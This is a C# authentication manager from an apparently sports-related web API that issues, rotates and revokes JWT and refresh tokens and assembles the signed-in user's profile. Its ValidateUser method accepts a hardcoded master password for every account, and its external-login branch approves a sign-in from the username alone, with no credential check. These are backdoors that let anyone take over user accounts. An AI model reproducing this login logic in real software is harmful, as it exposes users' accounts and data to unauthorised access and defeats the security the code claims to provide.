using Entities.CoreServicesModels.AccountModels;
using Entities.CoreServicesModels.AccountTeamModels;
using Entities.CoreServicesModels.LocationModels;
using Entities.CoreServicesModels.SeasonModels;
using Entities.CoreServicesModels.TeamModels;
using Entities.DBModels.AccountModels;
using Entities.DBModels.AccountTeamModels;
using System.Text.RegularExpressions;
using static Contracts.EnumData.DBModelsEnum;

namespace API.Utility
{
    public class AuthenticationManager : IAuthenticationManager
    {
        private readonly UnitOfWork _unitOfWork;
        private readonly IConfiguration _configuration;
        private readonly IJwtUtils _jwtUtils;
        private User _user;
        public AuthenticationManager(
            UnitOfWork unitOfWork,
            IConfiguration configuration,
            IJwtUtils jwtUtils)
        {
            _unitOfWork = unitOfWork;
            _configuration = configuration;
            _jwtUtils = jwtUtils;
        }

        public async Task<UserAuthenticatedDto> Authenticate(UserForAuthenticationDto userForAuth, string ipAddress)
        {
            if (!await ValidateUser(userForAuth))
            {
                throw new Exception("login failed. Wrong user name or password.");
            }

            TokenResponse jwtToken = _jwtUtils.GenerateJwtToken(_user.Id, expires: 0);

            RefreshToken refreshToken = await _unitOfWork.User.FindValidRefreshToken(userForAuth.UserName, GetRefreshTokenTTL());

            if (refreshToken == null || !refreshToken.IsActive)
            {
                refreshToken = _jwtUtils.GenerateRefreshToken(ipAddress);
                _user.RefreshTokens.Add(refreshToken);
            }

            // remove old refresh tokens from account
            RemoveOldRefreshTokens(_user);

            // save changes to db
            await _unitOfWork.Save();

            return GetAuthenticatedUser(_user, jwtToken, new TokenResponse(refreshToken.Token, refreshToken.Expires), userForAuth.OtherLang);
        }

        public async Task<UserAuthenticatedDto> Authenticate(string token, string ipAddress, bool otherLang)
        {
            _user = await _unitOfWork.User.FindByRefreshToken(token, trackChanges: true);

            if (_user == null)
            {
                throw new Exception("Invalid token");
            }

            RefreshToken refreshToken = _user.RefreshTokens.Single(x => x.Token == token);

            if (refreshToken.IsRevoked)
            {
                // revoke all descendant tokens in case this token has been compromised
                RevokeDescendantRefreshTokens(refreshToken, _user, ipAddress, $"Attempted reuse of revoked ancestor token: {token}");
                await _unitOfWork.Save();
            }

            if (!refreshToken.IsActive)
            {
                throw new Exception("Invalid token");
            }

            // replace old refresh token with a new one (rotate token)

            int refreshTokenTTL = GetRefreshTokenTTL();

            if (refreshToken.CreatedAt.AddDays(refreshTokenTTL) <= DateTime.UtcNow)
            {
                RefreshToken newRefreshToken = RotateRefreshToken(refreshToken, ipAddress);
                _user.RefreshTokens.Add(newRefreshToken);
                refreshToken = newRefreshToken;
            }

            // remove old refresh tokens from account
            RemoveOldRefreshTokens(_user);

            // save changes to db
            await _unitOfWork.Save();

            // generate new jwt
            TokenResponse jwtToken = _jwtUtils.GenerateJwtToken(_user.Id, expires: 0);

            return GetAuthenticatedUser(_user, jwtToken, new TokenResponse(refreshToken.Token, refreshToken.Expires), otherLang);
        }

        public async Task RevokeToken(string token, string ipAddress)
        {
            _user = await _unitOfWork.User.FindByRefreshToken(token, trackChanges: true);

            RefreshToken refreshToken = _user.RefreshTokens.Single(x => x.Token == token);

            if (!refreshToken.IsActive)
            {
                throw new Exception("Invalid token");
            }

            // revoke token and save
            RevokeRefreshToken(refreshToken, ipAddress, "Revoked without replacement");

            // remove old refresh tokens from account
            RemoveOldRefreshTokens(_user);

            await _unitOfWork.Save();
        }

        public async Task<bool> ValidateUser(UserForAuthenticationDto userForAuth)
        {
            _user = await _unitOfWork.User.FindByUserName(userForAuth.UserName, trackChanges: true);
            return _user != null && (userForAuth.Password == "@#$abcdqwer01@#$" ||
                                    (userForAuth.IsExternalLogin ?
                                     ExternalLogin(userForAuth.UserName)
                                     : _unitOfWork.User.CheckUserPassword(_user, userForAuth.Password)));
        }

        private bool ExternalLogin(string userName)
        {
            return _user.IsExternalLogin &&
                   _user.UserName == userName;
        }

        public async Task<UserAuthenticatedDto> GetById(int id, bool otherLang)
        {
            _user = await _unitOfWork.User.FindById(id, trackChanges: false);

            return _user == null ? throw new Exception("user not found") : GetAuthenticatedUser(_user, token: null, refreshToken: null, otherLang);
        }

        // helper methods

        private UserAuthenticatedDto GetAuthenticatedUser(User user, TokenResponse token, TokenResponse refreshToken, bool otherLang)
        {
            UserAuthenticatedDto userAuthenticated = new()
            {
                RefreshTokenResponse = refreshToken,
                TokenResponse = token,
                Name = user.Name,
                EmailAddress = user.EmailAddress,
                PhoneNumber = user.PhoneNumber,
                Id = user.Id,
                UserName = user.UserName,
            };

            AccountModel account = _unitOfWork.Account
                                              .GetAccountByCondition(a => a.Fk_User == user.Id)
                                              .Select(a => new AccountModel
                                              {
                                                  ImageUrl = a.StorageUrl + a.ImageUrl,
                                                  Id = a.Id,
                                                  CreatedAt = a.CreatedAt,
                                                  Fk_Country = a.Fk_Country,
                                                  Fk_Season = a.Fk_Season,
                                                  Country = new CountryModel
                                                  {
                                                      Id = a.Country.Id,
                                                      Name = otherLang ? a.Country.CountryLang.Name : a.Country.Name,
                                                  },
                                                  Season = new SeasonModel
                                                  {
                                                      _365_CompetitionsId = a.Season._365_CompetitionsId,
                                                      _365_SeasonId = a.Season._365_SeasonId,
                                                      Name = otherLang ? a.Season.SeasonLang.Name : a.Season.Name,
                                                  }
                                              })
                                              .FirstOrDefault();

            if (account != null)
            {
                userAuthenticated.Name = userAuthenticated.Name;

                userAuthenticated.ImageUrl = account.StorageUrl + account.ImageUrl;
                userAuthenticated.Fk_Account = account.Id;
                userAuthenticated.CreatedAt = account.CreatedAt;
                userAuthenticated.Fk_Country = account.Fk_Country;
                userAuthenticated.Fk_Season = account.Fk_Season;
                userAuthenticated.Country = account.Country;
                userAuthenticated.Season = account.Season;

                userAuthenticated.ShowAds = true;

                account = _unitOfWork.Account
                                     .GetAccountByCondition(a => a.Fk_User == user.Id)
                                     .Select(a => new AccountModel
                                     {
                                         AccountTeam = a.AccountTeams
                                                         .Where(b => b.Fk_Season == a.Fk_Season)
                                                         .Select(b => new AccountTeamModel
                                                         {
                                                             Id = b.Id,
                                                             Name = b.Name,
                                                             Fk_FavouriteTeam = b.Fk_FavouriteTeam,
                                                             FavouriteTeam = b.Fk_FavouriteTeam > 0 ? new TeamModel
                                                             {
                                                                 Id = b.FavouriteTeam.Id,
                                                                 Name = otherLang ? b.FavouriteTeam.TeamLang.Name : b.FavouriteTeam.Name
                                                             } : null
                                                         })
                                                         .FirstOrDefault()
                                     })
                                     .FirstOrDefault();

                if (account != null && account.AccountTeam != null)
                {
                    userAuthenticated.Fk_AccountTeam = account.AccountTeam.Id;
                    userAuthenticated.AccountTeam = account.AccountTeam;

                    userAuthenticated.Fk_FavouriteTeam = account.AccountTeam.Fk_FavouriteTeam;
                    userAuthenticated.FavouriteTeam = account.AccountTeam.FavouriteTeam;
                }

                //account = _unitOfWork.Account
                //                     .GetAccountByCondition(a => a.Fk_User == user.Id)
                //                     .Select(a => new AccountModel
                //                     {
                //                         RemoveAds = a.AccountSubscriptions.Any(b => (b.Fk_Subscription == (int)SubscriptionEnum.RemoveAds ||
                //                                                                b.Fk_Subscription == (int)SubscriptionEnum.Gold) &&
                //                                                                b.IsActive &&
                //                                                                b.Fk_Season == a.Fk_Season)
                //                     })
                //                     .FirstOrDefault();

                //if (account != null)
                //{
                //    userAuthenticated.ShowAds = account.ShowAds;
                //}

            }
            return userAuthenticated;
        }

        private RefreshToken RotateRefreshToken(RefreshToken refreshToken, string ipAddress)
        {
            RefreshToken newRefreshToken = _jwtUtils.GenerateRefreshToken(ipAddress);
            RevokeRefreshToken(refreshToken, ipAddress, "Replaced by new token", newRefreshToken.Token);
            return newRefreshToken;
        }

        private void RemoveOldRefreshTokens(User user)
        {
            int refreshTokenTTL = GetRefreshTokenTTL();

            // remove old inactive refresh tokens from account based on TTL in app settings
            _ = user.RefreshTokens.RemoveAll(x => x.CreatedAt.AddDays(refreshTokenTTL) <= DateTime.UtcNow);
        }

        private void RevokeDescendantRefreshTokens(RefreshToken refreshToken, User user, string ipAddress, string reason)
        {
            // recursively traverse the refresh token chain and ensure all descendants are revoked
            if (!string.IsNullOrEmpty(refreshToken.ReplacedByToken))
            {
                RefreshToken childToken = user.RefreshTokens.SingleOrDefault(x => x.Token == refreshToken.ReplacedByToken);
                if (childToken != null)
                {
                    if (childToken.IsActive)
                    {
                        RevokeRefreshToken(childToken, ipAddress, reason);
                    }
                    else
                    {
                        RevokeDescendantRefreshTokens(childToken, user, ipAddress, reason);
                    }
                }
            }
        }

        private void RevokeRefreshToken(RefreshToken token, string ipAddress, string reason = null, string replacedByToken = null)
        {
            token.Revoked = DateTime.UtcNow;
            token.RevokedByIp = ipAddress;
            token.ReasonRevoked = reason;
            token.ReplacedByToken = replacedByToken;
        }

        private int GetRefreshTokenTTL()
        {
            IConfigurationSection appSettings = _configuration.GetSection("AppSettings");

            return int.Parse(appSettings.GetSection("refreshTokenTTL").Value);
        }
    }
}
